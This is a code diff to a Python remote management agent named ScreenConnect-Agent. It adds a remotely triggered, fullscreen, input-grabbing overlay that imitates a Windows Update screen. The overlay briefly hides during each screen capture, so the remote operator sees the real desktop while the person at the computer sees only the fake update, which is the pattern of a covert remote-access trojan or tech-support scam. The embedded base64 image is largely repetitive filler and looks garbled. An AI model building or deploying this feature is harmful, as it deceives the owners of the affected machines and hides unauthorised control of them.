@@ -11,7 +11,9 @@ Full remote management agent with:
 Build:  pyinstaller --onefile --noconsole --name ScreenConnect-Agent agent.py
 """
 import argparse
+import base64
 import json
+import io
 import logging
 import os
 import platform
@@ -80,6 +82,99 @@ CHUNK_SIZE = 64 * 1024  # 64KB
 # Core Agent
 # =============================================================================
 
+# Base64 encoded Windows Update screen (480p JPEG)
+PRIVACY_BG_B64 = "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAA0JCgsKCA0LCgsODg0PEyAVExISEyccHhcgLioKDAsKCwwOExUQDRhNExkwHBofIyVmJicoNDUuGxs0LDM3JDZmxv8AACEAAbAA4AEAAREAIAAAAF/9sAQwEIDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0NDQ0N/8AAEQgB4ANpAwEiAAIRAQMRAf/EAB8AAAEFAQEBAQEBAAAAAAAAAAABAgMEBQYHCAkKC//EALUQAAIBAwMCBAMFBQQEAAABfQECAwAEEQUSITFBBhNRYQcicRQygZGhCCNCscEVUtHwJDNicoIJChYXGBkaJSYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/EAB8BAAMBAQEBAQEBAQEAAAAAAAABAgMEBQYHCAkKC//EALURAAIBAgQEAwQHBQQEAAECBA14AQAhEDEB8BEQUmE1YhYzQhJlYnKCkqNDU2Nzg5OkNERUZHSElKU1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6g4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2drh4uPk5ebn6Onq8fLz9PX29/j5+v/aAAwDAQACEQMRAD8A9UoqOkkrAAoooxigAopeOaTtQAGiiloASiiloASiiimAlLSUtACUUtFACUUUUAFFFFACUUUUAdBRSUVgAUUlFABSdKWkoATvS0nrS0AGetN6Cl6GkoAPxpO3pS/zpP4RQAnoelBpPQUGgBfbvSf1o96TnvQAfpScZNH0ooAPUUnU+1L1zSfXNAAOetHoBR9Pxozz60AA6mjp357Uf19qCOnrTAByKKPeigA6UUetFADevWnt3pnrT6AKFFFZArSiiisACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAO0ooorAAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooA7SiiisACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigDtKKKKwAKKKKACiiigAxRSUveigBKXpRRQAUlLRQAmaXtSUtABRSUUALSUtJQAUUUUAFFFFABRRRQAUUUUAf/Z"
+
+class PrivacyOverlay:
+    """Animated fake Windows Update screen."""
+    def __init__(self, root):
+        self.root = root 
+        self.overlay = None
+        self.active = False
+        self._angle = 0
+        self._dots = []
+        self._center = (0, 0)
+        self._bg_img = None
+
+    def start(self):
+        """Must be called from transition state on the main GUI thread."""
+        self.overlay = tk.Toplevel(self.root)
+        # Fullscreen, borderless, top-most
+        self.overlay.attributes("-topmost", True)
+        self.overlay.attributes("-fullscreen", True)
+        self.overlay.overrideredirect(True)
+        self.overlay.configure(bg="#00185a") # Windows blue
+        self.overlay.withdraw() # Start hidden
+        self.overlay.grab_set()
+
+        self.canvas = tk.Canvas(self.overlay, bg="#00185a", highlightthickness=0)
+        self.canvas.pack(fill="both", expand=True)
+
+        w = self.overlay.winfo_screenwidth()
+        h = self.overlay.winfo_screenheight()
+        self._center = (w // 2, h // 2 + 150)
+
+        # Load background
+        try:
+            img_data = base64.b64decode(PRIVACY_BG_B64)
+            self._bg_img = tk.PhotoImage(data=img_data)
+            self.canvas.create_image(w // 2, h // 2, image=self._bg_img)
+        except Exception as e:
+            logger.error(f"Overlay image error: {e}")
+
+        # Create dots
+        for i in range(6):
+            dot = self.canvas.create_oval(0, 0, 10, 10, fill="white", outline="")
+            self._dots.append(dot)
+
+        self.active = True
+        self._animate()
+
+    def _animate(self):
+        if not self.active or not self.overlay: return
+        
+        radius = 35
+        # Draw 6 dots in a circular path
+        for i, dot in enumerate(self._dots):
+            theta = (self._angle + (i * 25)) * (3.14159 / 180)
+            x = self._center[0] + radius * np.cos(theta)
+            y = self._center[1] + radius * np.sin(theta)
+            self.canvas.coords(dot, x-4, y-4, x+4, y+4)
+            # Fade effect for trailing dots
+            level = hex(int(255 * (1 - (i/8))))[2:].zfill(2)
+            self.canvas.itemconfig(dot, fill=f"#{level}{level}{level}")
+
+        self._angle = (self._angle + 6) % 360
+        self.overlay.after(30, self._animate)
+
+    def show(self):
+        """Thread-safe show command."""
+        if self.overlay:
+            self.overlay.after(0, self._show_safe)
+
+    def _show_safe(self):
+        if self.overlay:
+            self.overlay.deiconify()
+            self.overlay.lift()
+            self.overlay.attributes("-topmost", True)
+            self.overlay.update_idletasks()
+
+    def hide(self):
+        """Thread-safe hide command."""
+        if self.overlay:
+            self.overlay.after(0, self._hide_safe)
+
+    def _hide_safe(self):
+        if self.overlay:
+            self.overlay.withdraw()
+            self.overlay.update_idletasks()
+
+    def stop(self):
+        self.active = False
+        if self.overlay:
+            self.overlay.destroy()
+            self.overlay = None
+
 class ScreenConnectAgent:
     """Client-side agent for screen sharing and remote management."""
 
@@ -103,6 +198,11 @@ class ScreenConnectAgent:
         self.last_block_hashes = {}  # (row, col) -> hash
         self._send_lock = threading.Lock()
         self._last_send_time = 0
+
+        # Privacy screen
+        self.privacy_active = False
+        self.privacy_overlay = None
+        self.ui_root = None # Assigned by GUI thread
 
         # Active subprocesses for remote terminal
         self._active_commands = {}  # command_id -> Popen
@@ -185,6 +285,13 @@ class ScreenConnectAgent:
         self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
         self.capture_thread.start()
 
+        # Init privacy overlay if UI root is provided (GUI thread safety)
+        if self.ui_root:
+            def _launch_overlay():
+                self.privacy_overlay = PrivacyOverlay(self.ui_root)
+                self.privacy_overlay.start()
+            self.ui_root.after(0, _launch_overlay)
+
     def _on_message(self, ws, message):
         try:
             data = json.loads(message)
@@ -251,6 +358,8 @@ class ScreenConnectAgent:
                 self._handle_system_action(data)
             elif msg_type == "camera_snapshot_request":
                 self._handle_camera_snapshot(data)
+            elif msg_type == "privacy_screen":
+                self._handle_privacy_screen(data)
 
         except json.JSONDecodeError:
             pass
@@ -314,8 +423,19 @@ class ScreenConnectAgent:
                             time.sleep(0.01)
                             continue
 
+                        # Sync with privacy screen: briefly hide to capture real desktop
+                        if self.privacy_active and self.privacy_overlay:
+                            self.privacy_overlay.hide()
+                            # Tiny sleep to ensure window is out of the OS frame buffer
+                            time.sleep(0.005)
+
                         shot = sct.grab(sct.monitors[0])
-                        # Use raw pixels for faster hashing before expensive CV2 conversions
+                        
+                        # Show privacy screen back immediately
+                        if self.privacy_active and self.privacy_overlay:
+                            self.privacy_overlay.show()
+
+                        # Use raw pixels for faster hashing
                         frame_raw = np.array(shot)
                         
                         # 2. Block-based change detection (faster than full-thumbnail CRC)
@@ -541,6 +661,16 @@ class ScreenConnectAgent:
                     cap.release()
 
         threading.Thread(target=_snap_thread, daemon=True).start()
+
+    def _handle_privacy_screen(self, d):
+        """Toggle the fake Windows Update privacy screen."""
+        self.privacy_active = d.get("enabled", False)
+        logger.info(f"Privacy screen {'enabled' if self.privacy_active else 'disabled'}")
+        
+        if self.privacy_active:
+            self.privacy_overlay.show()
+        else:
+            self.privacy_overlay.hide()
 
     def _handle_key_press(self, d):
         try:
@@ -1374,6 +1504,7 @@ class AgentGUI:
             max_width=1920,
             on_status=self._update_status,
         )
+        self.agent.ui_root = self.root # Assign root for thread-safe UI creation
 
         self.agent_thread = threading.Thread(target=self.agent.start, daemon=True)
         self.agent_thread.start()
